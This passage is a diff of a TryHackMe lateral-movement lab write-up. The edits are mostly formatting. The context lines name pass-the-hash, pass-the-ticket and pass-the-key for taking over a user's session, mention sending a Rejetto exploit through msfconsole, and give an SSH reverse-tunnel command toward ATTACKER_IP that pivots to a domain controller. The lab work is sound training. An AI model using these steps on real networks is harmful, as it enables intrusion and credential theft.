@@ -1050,13 +1050,14 @@ This is network‑layer refusal.
 Let’s break down exactly why this happens in TryHackMe AD rooms and how to confirm it.
 
 #### Why THMJMP2 rejects RDP connections
+
 TryHackMe’s Lateral Movement & Pivoting room has this behaviour:
 
-✔ THMJMP2 does NOT allow RDP logins
-✔ Only WinRM (WinRS) and SMB are enabled
-✔ RDP is intentionally disabled to force you to use Kerberos or WinRS
-✔ The room’s instructions never mention RDP access to THMJMP2
-✔ The room’s intended RDP target is THMIIS, not THMJMP2
+-  THMJMP2 does NOT allow RDP logins
+-  Only WinRM (WinRS) and SMB are enabled
+-  RDP is intentionally disabled to force you to use Kerberos or WinRS
+-  The room’s instructions never mention RDP access to THMJMP2
+-  The room’s intended RDP target is THMIIS, not THMJMP2
 
 #### Next Kerberos tickets → Pass‑the‑Ticket
 
@@ -1185,11 +1186,13 @@ SID               : S-1-5-18
 ```
 
 Your goal:
+
 - Extract authentication material for t1_toby.beck  
 - Inject it into your current session
 - Obtain a shell authenticated as t1_toby.beck
 
 Any of these techniques are acceptable:
+
 - Pass‑the‑Hash
 - Pass‑the‑Ticket
 - Pass‑the‑Key
@@ -1469,7 +1472,7 @@ Attacker listening port 7878 connects to THMJMP2 on port 6001.
 THMJMP connects to target listening on port 8001 to port 80 on target THMDC.
 Once configured the MSFCONSOLE sends the rejetto exploit to thmdc to gain remote connection.
 
-SSH command on THMJMP2:
+SSH command on THMJMP2 (for some reason sometimes drop the \ that usually connect next line):
 ```
 ssh tunneluser@ATTACKER_IP \
   -R 8001:thmdc.za.tryhackme.com:80 \
